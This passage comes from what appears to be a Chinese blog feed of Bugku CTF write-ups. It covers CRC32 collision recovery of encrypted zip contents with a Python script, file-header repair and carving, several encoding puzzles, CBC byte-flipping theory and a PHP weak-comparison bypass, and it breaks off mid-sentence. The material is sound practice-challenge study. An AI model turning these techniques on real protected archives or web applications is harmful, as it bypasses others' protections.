            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> Python </tag>
            
            <tag> 加密 </tag>
            
            <tag> ZIP </tag>
            
            <tag> 爆破 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-好多压缩包</title>
      <link href="/2019/01/21/201906/"/>
      <url>/2019/01/21/201906/</url>
      
        <content type="html"><![CDATA[<p><strong>好多压缩包-writeup</strong><br><a id="more"></a><br>打开题目<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj7ec1paj30dw0a1aa6.jpg" alt=""><br>得到一个压缩包附件，进行解压，查看到里面有68个压缩包<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj7mvn7rj30oy0p8gon.jpg" alt=""><br>打开68个文件发现里面每个压缩包里都有一个四个字节大小的txt文档（加密），首先尝试下是不是<strong>伪加密</strong>，发现不是尝试下爆破无果。。。然后想了下，这么多压缩包，不可能让我们爆破吧，尝试下<strong>crc32碰撞</strong><br><strong>CRC32碰撞可以参考我写的文章</strong><a href="https://axiaowei.cn/2019/01/22/201915/">zip压缩包–加密篇</a><em>**</em><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj7rh1uzj30b307hq2v.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj7wotw7j312g08675e.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj819q33j30l909mq2y.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj8qg3kcj312d03qa9z.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj86znuzj30ya0amglr.jpg" alt=""></p><p>分析里面得文件得四个字节，想着应该是英文，中文字符得话跟爆破没区别…<br>猜测里面为四个字符（英文），获取zip文件得crc32值，进行crc碰撞<br>碰撞出来发现是一串base64，拿去解密(有些网站解码不了，解码了也是有问题的，多尝试几个)，放入winhex，发现导入进去的时候老是有问题，我不知道怎么处理，莫名其妙的多了很多空格，搜索了下感觉他们很顺利的就放进去了<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kj8bx2eoj30sm0etgn0.jpg" alt=""><br>尝试多次发现无果。然后无奈就自己写python实现直接base64解密后直接写入文件里<br>python脚本：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line">import binascii</span><br><span class="line">import <span class="keyword">string</span></span><br><span class="line">import zipfile</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">dicts = <span class="keyword">string</span>.printable  <span class="comment"># 可打印字符的字符串。ascii码33-126号</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def collision_crc(crc):</span><br><span class="line">    <span class="built_in">global</span> out_file</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">a</span> <span class="keyword">in</span> dicts:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> dicts:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> dicts:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> dicts:</span><br><span class="line">                    strings = <span class="keyword">a</span> + b + c + d</span><br><span class="line">                    strings = strings.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(strings)):</span><br><span class="line">                        out_file.<span class="built_in">write</span>(strings.decode(<span class="string">'utf-8'</span>))</span><br><span class="line">                        <span class="comment"># print(strings)</span></span><br><span class="line">                        <span class="literal">return</span></span><br><span class="line">                        <span class="comment"># 以上定义一个方法，组合随机字符与CRC进行碰撞，判断如果相等及写入文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def obtain_zip():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">68</span>):</span><br><span class="line">        <span class="built_in">file</span> = <span class="string">'out'</span> + str(i) + <span class="string">'.zip'</span></span><br><span class="line">        zip_file = zipfile.ZipFile(<span class="built_in">file</span>, <span class="string">'r'</span>)  <span class="comment"># 读取创建zip_file对象</span></span><br><span class="line">        get_crc = zip_file.getinfo(<span class="string">'data.txt'</span>)  <span class="comment"># 压缩文件夹里的data.txt文件，获取文档内指定的文件信息</span></span><br><span class="line">        crc = get_crc.CRC</span><br><span class="line">        <span class="comment">#  以上定义一个方法，获取68个zip的CRC的值</span></span><br><span class="line">        collision_crc(crc)  <span class="comment"># 再调用collision方法传参</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">out_file = <span class="built_in">open</span>(<span class="string">'out.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">obtain_zip()</span><br><span class="line">out_file.<span class="built_in">close</span>()</span><br><span class="line"></span><br><span class="line">out_file2 = <span class="built_in">open</span>(<span class="string">'out.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'flag.rar'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> rar:</span><br><span class="line">    rar.<span class="built_in">write</span>(base64.b64decode(out_file2.<span class="built_in">read</span>()))   <span class="comment"># 二进制将转换后的base64位写入文件</span></span><br></pre></td></tr></table></figure></p><p>运行完成后将写出的文件，打开发现打开失败，导入16进制编辑器，观察数据，发现存在rar的文件尾C4 3D 7B 00 40 07 00，但缺少文件头，于是补上rar的文件头52 61 72 21 1A 07 00，发现文件修复成功，解压发现是一个flag在压缩包注释上。二进制上也可以看到CMT，CMT即为comment（注释）<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjbwelnrj30um0ko0v4.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjc2iio8j31290gqdh3.jpg" alt=""></p><p><strong>这里说明下我之前base64导入进去的出现的问题，因为心里一直纳闷，所以去<br>多次尝试发现需要利用notepad++32位的进行base64解密，就可以得到正确的值，保存为.rar文件，然后进行导入十六进制编辑工具里是可以实现的。（之前用的时notepad++64位的会出现解密不出来的情况，几个在线工具解密出来的值都是错误的或者跟上面导进去不知道为什么多了很多空格这些）这里举几个对比：</strong><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjc901w9j30tf06y0t3.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjcckm30j315b08pdgm.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjci3721j30w8062aae.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjcqu1r5j30iy08kt91.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-怀疑人生</title>
      <link href="/2019/01/20/201907/"/>
      <url>/2019/01/20/201907/</url>
      
        <content type="html"><![CDATA[<p><strong>怀疑人生–wirteup</strong><br><a id="more"></a><br>打开题目<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kje6gw22j30ds0a5jrh.jpg" alt=""><br>得到一个附件，发现是zip的文件头，直接在后缀上加上一个.zip。解压，发现三个文件。第一个需要解压密码，先看下其他文件有没有其他hint<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjebchi0j30fo07rgmd.jpg" alt=""><br>直接丢进kali，分析一波，分离ctf2.jpg得到一个压缩包<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjefkn4yj30kl0dt45k.jpg" alt=""><br>解压，里面存在一个txt文本，发现一串加密得密文<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjejt7d7j30se0dqdh5.jpg" alt=""><br>Brainfuck/Ook!编码，拿去Ook解密<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjeot5o9j30dl05tjrp.jpg" alt=""><br>来看这个奇怪得二维码，直接那QR扫以下看下有什么信息，得到内容<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjetmcupj30eq0e90tx.jpg" alt=""><br>折腾了挺久也好像没有其他信息了，字典破解，尝试下，还真有！<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjf072yvj30dp051aa2.jpg" alt=""><br>解压得到一串base64，进行base64解密，得到一串unicode，进行解密<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjf5r2p6j30oi0940sp.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjfa0fuoj30lc092dfr.jpg" alt=""><br>解密后进行拼接，提交发现失败，尝试多次，很纳闷，感觉不对劲，中间那Ook解密后感觉还是一个密文，查了一下是一个base58？？？<br>进行解密<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjffm3ffj30s00edglo.jpg" alt=""><br>得到明文，进行ctf1+ctf2+ctf3进行拼接，提交成功。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">此题出现了几种编码：</span><br><span class="line">base64:</span><br><span class="line">Base64是网络上最常见的用于传输<span class="number">8</span>Bit字节码的编码方式之一，Base64就是一种基于<span class="number">64</span>个可打印字符来表示二进制数据的方法。</span><br><span class="line"></span><br><span class="line">base58:</span><br><span class="line">Base58是用于Bitcoin中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址,相比Base64，Base58不使用数字<span class="string">"0"</span>，字母大写<span class="string">"O"</span>，字母大写<span class="string">"I"</span>，和字母小写<span class="string">"l"</span>，以及<span class="string">"+"</span>和<span class="string">"/"</span>符号.</span><br><span class="line"></span><br><span class="line">Unicode:</span><br><span class="line">Unicode又称（统一码、万国码、单一码）世界上存在着多种编码方式，同一个二进制数字可以被解释成不同的符号。因此，要想打开一个文本文件，就必须知道它的编码方式，否则用错误的编码方式解读，就会出现乱码。为什么电子邮件常常出现乱码？就是因为发信人和收信人使用的编码方式不一样。</span><br><span class="line">可以想象，如果有一种编码，将世界上所有的符号都纳入其中。每一个符号都给予一个独一无二的编码，那么乱码问题就会消失。这就是 Unicode，就像它的名字都表示的，这是一种所有符号的编码。</span><br><span class="line"></span><br><span class="line">Brainfuck/Ook:</span><br><span class="line">Brainfuck是一种极小化的计算机语言，它是由Urban Müller在<span class="number">1993</span>年创建的。由于fuck在英语中是脏话，这种语言有时被称为brainf*ck或brainf**k，甚至被简称为BF。</span><br><span class="line">OOK！是一种为红毛猩猩设计的编程语言。OOK！与众所周知的深奥语言BrainF ***基本上是同构的 ，但语法元素更少。详情可跳转至http:<span class="comment">//www.dangermouse.net/esoteric/ook.html</span></span><br><span class="line"></span><br><span class="line">二维码:</span><br><span class="line">二维码又称二维条码，常见的二维码为QR Code，QR全称Quick Response，是一个近几年来移动设备上超流行的一种编码方式，它比传统的Bar Code条形码能存更多的信息，也能表示更多的数据类型。</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> Brainfuck </tag>
            
            <tag> Ook </tag>
            
            <tag> Unicode </tag>
            
            <tag> base64 </tag>
            
            <tag> base58 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入攻击</title>
      <link href="/2019/01/20/201913/"/>
      <url>/2019/01/20/201913/</url>
      
        <content type="html"><![CDATA[<p>待更新…..</p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CBC字节翻转攻击原理</title>
      <link href="/2019/01/20/201912/"/>
      <url>/2019/01/20/201912/</url>
      
        <content type="html"><![CDATA[<h5 id="CBC字节翻转攻击原理"><a href="#CBC字节翻转攻击原理" class="headerlink" title="CBC字节翻转攻击原理"></a>CBC字节翻转攻击原理</h5><a id="more"></a><p>CBC模式：Cipher Black Chaining mode (密码分组链接模式)<br>CBC模式进行加解密是都需要一个随机初始向量iv，在第一轮进行加解密是都需要与iv进行xor的。</p><p>任何字符与本身xor都是为0，任何字符与0xor都为本身，如A xor A=0，A xor 0=A</p><p>加密过程<br>1、将明文分为若干组（16个字节为一组），最后一组不足则用特殊字符填充<br>2、生成一个初始向量iv和key密钥<br>3、用iv与第一组明文异或（iv只影响第一组生成的密文）生成密文<br>4、然后再用前n组密文与后n+1组明文异或生成第n+1组密文，以次重复<br>5、最后将生成的密文拼接起来，就成了最终密文<br>加密公式：<br>Ciphertext-0 = Encrypt(Plaintext XOR IV)—只用于第一个组块<br>Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)—用于第二及剩下的组块</p><p>解密过程：<br>1、将密文分组<br>2、用iv与第一组密文xor，解密得到第一组明文<br>3、用第n组密文与第n+1组密文xor，解密得到第n+1组明文，以此类推<br>4、将各组的明文拼接在一起就是最终要得到的明文了</p><p>注意一下：解密的时候前一组密文只影响后一组明文的结果，而不会影响其他组明文的结果，由图也可看得出，这个也是进行攻击的重要之处。</p><p>有一条经验法则是（注：结合上面的说明图可以得到），你在密文中改变的字节，只会影响到在下一明文当中，具有相同偏移量的字节。所以我们目标的偏移量是2：  </p><h5 id="CBC字节翻转攻击原理图"><a href="#CBC字节翻转攻击原理图" class="headerlink" title="CBC字节翻转攻击原理图"></a>CBC字节翻转攻击原理图</h5><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjg2js8ej311s1rpdnh.jpg" alt=""><br><a href="http://processon.com/chart_image/5c37fd8de4b0db2e59306630.png" target="_blank" rel="noopener">http://processon.com/chart_image/5c37fd8de4b0db2e59306630.png</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">XOR</span>异或运算</span><br><span class="line">异或，英文为exclusive <span class="keyword">OR</span>，缩写成<span class="keyword">xor</span></span><br><span class="line">异或的数学符号为“⊕”</span><br><span class="line">异或略称为<span class="keyword">XOR</span>、EOR、EX-<span class="keyword">OR</span></span><br><span class="line">程序中有三种演算子：<span class="keyword">XOR</span>、<span class="keyword">xor</span>、⊕。</span><br><span class="line">两个输入相同时为<span class="number">0</span>，不同则为<span class="number">1</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> CBC </tag>
            
            <tag> 加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-论剑</title>
      <link href="/2019/01/20/201909/"/>
      <url>/2019/01/20/201909/</url>
      
        <content type="html"><![CDATA[<p><strong>论剑-writeup</strong><br><a id="more"></a><br>因为很少人做出来，导致网上很少这个wp（找不到），所以我在这里记录下解题思路<br>打开题目<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjgi67t2j30ds0dbq33.jpg" alt=""><br>访问链接，把图片下载下来另存为<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjgmwlfbj30q907d0t7.jpg" alt=""><br>先把它丢进kali上binwalk扫描以下，发现有隐藏文件，foremost直接分离出来，得到两张图片<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjgvq1p8j30kg0dkwju.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjh1dfguj30wm0hidgx.jpg" alt=""><br>把图片都拿去二进制编辑工具查看下，在原图上搜索下FFD9（jpg的结束标识），发现有两个，以及一段二进制文件，很可疑<br>这段二进制拿去转ASCII码，得到mynameiskey!!!hhh 折腾了下，暂时先放着。<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjh5vjjrj30yf0lsn0x.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjhc8nb2j30cr0ey74r.jpg" alt=""><br>什么详细信息、备注都毫无hint，想着修改图片高度看下，发现新大陆，但是隐藏了一部分-_-!<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjhhckasj30xy0jbdi8.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjhms4mzj30g704r3yz.jpg" alt=""><br>把分离出来的图片都修改高度，发现跟原图一样，无果<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjhrqjebj31aw0f6wh1.jpg" alt=""><br>天坑，这里想打si作者的环节，在分离出来的两张图片，以及这段这段二进制狂下功夫，xor、盲水印、色道分析..折腾了一段时间并没有什么用<br>查看二进制那段信息发现，看到BC AF 27 1C好熟悉，好像特征码给改过，尝试修改,修复文件头<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjhwuj8tj30qp0drwgr.jpg" alt=""><br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">常见的文件头：</span></span><br><span class="line"><span class="number">7</span><span class="string">z</span></span><br><span class="line"><span class="string">文件头标识：37</span> <span class="number">7</span><span class="string">A</span> <span class="string">BC</span> <span class="string">AF</span> <span class="number">27</span> <span class="number">1</span><span class="string">C</span></span><br><span class="line"><span class="string">JPEG/JPG</span></span><br><span class="line"><span class="string">文件头标识:</span> <span class="string">ff,</span> <span class="string">d8</span> <span class="string">(SOI)</span> <span class="string">(JPEG</span> <span class="string">文件标识)</span> </span><br><span class="line"><span class="string">文件结束标识:</span> <span class="string">ff,</span> <span class="string">d9</span> <span class="string">(EOI)</span> </span><br><span class="line"><span class="string">PNG</span></span><br><span class="line"><span class="string">文件头标识：89</span> <span class="number">50</span> <span class="number">4</span><span class="string">E</span> <span class="number">47</span> <span class="number">0</span><span class="string">D</span> <span class="number">0</span><span class="string">A</span> <span class="number">1</span><span class="string">A</span> <span class="number">0</span><span class="string">A</span></span><br><span class="line"><span class="string">GIF</span></span><br><span class="line"><span class="string">文件头标识：47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span> <span class="number">39</span><span class="string">(37)</span> <span class="number">61</span><span class="meta">---</span> <span class="string">GIF89(7)a</span></span><br><span class="line"><span class="string">BMP</span></span><br><span class="line"><span class="string">文件头标识：42</span> <span class="number">4</span><span class="string">D---</span> <span class="string">BM</span></span><br><span class="line"><span class="string">HTML</span> <span class="string">(html)</span></span><br><span class="line"><span class="string">文件头标识：68746D6C3E</span> </span><br><span class="line"><span class="string">ZIP</span> <span class="string">Archive</span> <span class="string">(zip)</span></span><br><span class="line"><span class="string">文件头标识：504B0304</span> <span class="meta">---</span> <span class="string">PK</span></span><br><span class="line"><span class="string">RAR</span> <span class="string">Archive</span> <span class="string">(rar)</span></span><br><span class="line"><span class="string">文件头标识：52617221</span> </span><br><span class="line"><span class="string">等等..</span></span><br></pre></td></tr></table></figure></p><p>丢回kali用binwalk分析，发现多了一个压缩包，分离，注意使用foremost分离不出来，利用dd分离出来<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kji2yp33j30km0dpaga.jpg" alt=""><br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用dd命令分离文件，如:</span><br><span class="line">dd <span class="attribute">if</span>=hehe.jpg <span class="attribute">of</span>=hehe1.zip <span class="attribute">bs</span>=1 <span class="attribute">skip</span>=54163</span><br><span class="line"><span class="attribute">if</span>=file（源文件）</span><br><span class="line"><span class="attribute">of</span>=file（输出文件）</span><br><span class="line"><span class="attribute">bs</span>=bytes（一次性转换bytes个字节，及转换缓冲区大小）</span><br><span class="line"><span class="attribute">skip</span>=blocks（输入文件开头跳过blocks个块再开始复制--通俗点讲就是从哪开始）</span><br></pre></td></tr></table></figure></p><p>进行解压，需要密码，用二进制转的ASCII码进行解密，得到一张图片，修改高度，得到另一部分的flag，进行拼接<br>最终得到一个的密文<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjiabb0yj30v406qwg1.jpg" alt=""><br>这个不是md5，是一个base16密文，进行base16解密，得到flag<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjigjp66j30ra09cgli.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> base16 </tag>
            
            <tag> 文件头 </tag>
            
            <tag> ASCII </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-web3</title>
      <link href="/2019/01/20/201904/"/>
      <url>/2019/01/20/201904/</url>
      
        <content type="html"><![CDATA[<p><strong>web3-writeup</strong><br><a id="more"></a><br>打开题目<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjivzr37j30dt0b50sw.jpg" alt=""><br>点击访问链接，无限弹窗<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjj0ln0hj30xb0hm3yw.jpg" alt=""><br>好了，我点烦了，粗暴点直接按（Ctrl+u）直接强制查看源码，也可以自己直接使用view-source:URL，查看源码。<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjj5klaaj30x80gsmyk.jpg" alt=""><br>得到一段Unicode编码，Burp Suite直接解码，也可以在线的工具，百度一下很多的。<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjjce7nfj30oc0bqq3o.jpg" alt=""><br><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Unicode</span>编码：</span><br><span class="line"><span class="built_in">Unicode</span>码扩展自ASCII字元集。</span><br><span class="line"><span class="built_in">Unicode</span>（统一码、万国码、单一码）是计算机科学领域里的一项业界标准，包括字符集、编码方案等。<span class="built_in">Unicode</span> 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-矛盾</title>
      <link href="/2019/01/20/201910/"/>
      <url>/2019/01/20/201910/</url>
      
        <content type="html"><![CDATA[<p><strong>矛盾-writeup</strong><br><a id="more"></a><br>打开题目<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjjnv4xdj30dw0ahq30.jpg" alt=""><br>访问链接，得到一串代码，又是一道代码审计的题<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjjylnblj30so0b1jrc.jpg" alt=""><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//代码分析</span></span><br><span class="line">$num=$_GET[<span class="string">'num'</span>];  <span class="comment">//Get方式获取参数</span></span><br><span class="line"><span class="keyword">if</span>(!is_numeric($num)) <span class="comment">//is_numeric()函数是否为数字或者数字字符串-&gt;&gt;加个！取反,通俗点讲这里不能为数字</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> $num; <span class="comment">//如果不是数字就输出</span></span><br><span class="line"><span class="keyword">if</span>($num==<span class="number">1</span>) <span class="comment">//矛盾吧，上面又不要数字，这里又要是1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'flag&#123;**********&#125;'</span>; <span class="comment">//如果值为1则输出flag</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>根据提示，可以用科学计数法表示1，构造URL：?num=1<em>e</em>0.1 既不是纯数字，其值又等于1<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjk4jjxuj30q70a8t8w.jpg" alt=""></p><p>其实还有很多种姿势获取到flag，授人以鱼不如授人以渔。以下讲解几个特征。<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">php是一个弱类型语言</span><br><span class="line">==表示的是等于 ，比较两个变量的值，不比较数据类型。只要数值等于就成立了</span><br><span class="line">===表示的是全等，比较的是两个变量的值和类型</span><br><span class="line"><span class="section">== 判断时，当数字与字符串比较时，系统先将字符串转化为数字，再与数字进行比较。</span></span><br><span class="line"></span><br><span class="line">is<span class="emphasis">_numeric（）函数用于检测变量是否为数字或数字字符串。</span></span><br><span class="line"><span class="emphasis">is_</span>numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，怎么构造有思路了吗？</span><br><span class="line"></span><br><span class="line">PHP浅谈==和===：https://blog.csdn.net/auuuuuuuu/article/details/79621635</span><br><span class="line">科学计数法：https://baike.baidu.com/item/科学记数法/1612882?fr=aladdin</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-web基础$_POST</title>
      <link href="/2019/01/19/201905/"/>
      <url>/2019/01/19/201905/</url>
      
        <content type="html"><![CDATA[<p><strong>web基础$_POST-writeup</strong><br><a id="more"></a><br>打开题目，这是一道简单的post题<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjkgc20fj30e30apq36.jpg" alt=""><br>还是老规矩，点击访问链接，提示给出一串代码，分析代码，一道简单的代码审计。<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjko438rj30pf07o0ss.jpg" alt=""><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$what=$_POST[<span class="string">'what'</span>]; <span class="comment">//post提交数据赋值给变量</span></span><br><span class="line"><span class="keyword">echo</span> $what;</span><br><span class="line"><span class="keyword">if</span>($what==<span class="string">'flag'</span>) <span class="comment">//判断post提交的数据是否等于flag，如果true输出flag</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'flag&#123;****&#125;'</span>;</span><br></pre></td></tr></table></figure></p><p>我们只要post提交的变量what=falg就可以了，这里用一款熟悉的插件工具HackBak<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjkscyq8j31190oq0tw.jpg" alt=""><br>点击Execute提交，flag就出来了。<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span>提交：向指定的资源提交要被处理的数据。</span><br></pre></td></tr></table></figure></p><p><strong>浅析get与post的区别：</strong><br>定义了与服务器交互的不同方法，最基本的方法有4种，分别是GET，POST，PUT，DELETE（查、改、增、删）四个操作。<br>对资源的增，删，改，查操作，其实都可以通过GET/POST完成，不需要用到PUT和DELETE。  </p><p>GET请求一般不应产生副作用。就是说，它仅仅是获取资源信息，就像数据库查询一样，不会修改，增加数据，不会影响资源的状态。<br>GET请求的数据会附在URL之后（就是把数据放置在HTTP协议头中），以?分割URL和传输数据，参数之间以&amp;相连。  </p><p>POST把提交的数据则放置在是HTTP包的包体中。<br>POST的安全性要比GET的安全性高。  </p><p>get是从服务器上获取数据，post是向服务器传送数据。<br>get 和 